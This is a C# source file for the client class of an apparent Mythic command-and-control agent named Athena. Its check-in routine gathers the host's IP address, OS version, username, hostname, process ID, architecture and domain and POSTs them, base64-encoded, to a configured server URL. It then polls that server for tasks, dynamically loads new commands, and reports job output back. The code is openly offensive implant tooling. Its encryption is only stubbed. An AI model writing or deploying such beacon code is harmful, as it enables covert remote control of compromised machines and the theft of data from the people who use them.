using Athena.Mythic.Hooks;
using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Athena.Mythic.Model.Checkin;
using Athena.Mythic.Profile;
using System.Net;
using System.Diagnostics;
using Athena.Utilities;
using System.Net.Http;
using Newtonsoft.Json;
using Athena.Mythic.Model;
using Athena.Mythic.Model.Response;
using Athena.Commands.Model;

namespace Athena
{
    public class MythicClient
    {
        public Config2 MythicConfig { get; set; }
        public MythicClient()
        {
            this.MythicConfig = new Config2();
        }

        public CheckinResponse CheckIn()
        {
            if (Globals.encrypted)
            {
                //encrypt
            }
            switch (Globals.profile)
            {
                case ProfileType.HTTP:
                    break;
                case ProfileType.Websocket:
                    break;
                case ProfileType.SMB:
                    break;
            }
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id.ToString(),
                uuid = this.MythicConfig.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
            };
            var responseString = SendPOST(this.MythicConfig.postURL, ct).Result;
            try
            {
                CheckinResponse cs = JsonConvert.DeserializeObject<CheckinResponse>(Misc.Base64Decode(responseString).Substring(36));
                return cs;
            }
            catch
            {
                return new CheckinResponse();
            }
        }

        public List<MythicTask> GetTasks()
        {
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,

            };
            try
            {

                var responseString = SendPOST(this.MythicConfig.postURL, gt).Result;
                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
                GetTaskingResponse gtr = JsonConvert.DeserializeObject<GetTaskingResponse>(Misc.Base64Decode(responseString).Substring(36));
                return gtr.tasks;
            }
            catch
            {
                return null;
            }
        }

        public bool PostResponse(Dictionary<string,MythicJob> jobs)
        {
            List<ResponseResult> lrr = new List<ResponseResult>();
            foreach(var job in jobs.Values)
            {
                if (job.errored)
                {
                    //Probably turn this into a base response object and have that
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        status = "error",
                        completed = true,
                        user_output = job.taskresult
                    };
                    lrr.Add(rr);
                }
                else if(job.complete)
                {
                    if(job.task.command == "load")
                    {
                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
                        CommandsResponse cr = new CommandsResponse()
                        {
                            action = "add",
                            cmd = lc.name,
                        };
                        LoadCommandResponseResult rr = new LoadCommandResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            commands = new List<CommandsResponse>() { cr }
                        };
                        lrr.Add(rr);
                    }
                    else
                    {
                        ResponseResult rr = new ResponseResult()
                        {
                            task_id = job.task.id,
                            completed = true,
                            user_output = job.taskresult,
                            status = "complete"
                        };
                        lrr.Add(rr);
                    }
                }
                else
                {
                    ResponseResult rr = new ResponseResult()
                    {
                        task_id = job.task.id,
                        //completed = "false",
                        user_output = job.taskresult,
                        status = "processed"
                    };
                    lrr.Add(rr);
                }
            }

            PostResponseResponse prr = new PostResponseResponse()
            {
                action = "post_response",
                responses = lrr
            };

            try
            {
                var responseString = SendPOST(this.MythicConfig.postURL, prr).Result;
                Console.WriteLine("Response: " + Misc.Base64Decode(responseString).Substring(36));
                PostResponseResponse cs = JsonConvert.DeserializeObject<PostResponseResponse>(Misc.Base64Decode(responseString).Substring(36));
                if (cs.responses.Count < 1 || cs.responses[0].status != "success")
                {
                    return false;
                }
            }
            catch
            {
                return false;
            }

            return true;
        }
        private async Task<string> SendGET(string url)
        {
            try
            {
                var response = await Globals.client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
                return await response.Content.ReadAsStringAsync();
            }
            catch
            {
                return "";
            }
        }
        private async Task<string> SendPOST(string url, object obj)
        {
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                Console.WriteLine("Request: " + json);
                var content = new StringContent(Misc.Base64Encode(this.MythicConfig.uuid + json));
                var response = await Globals.client.PostAsync(url, content);
                return await response.Content.ReadAsStringAsync();
            }
            catch
            {
                return "";
            }
        }
    }
}
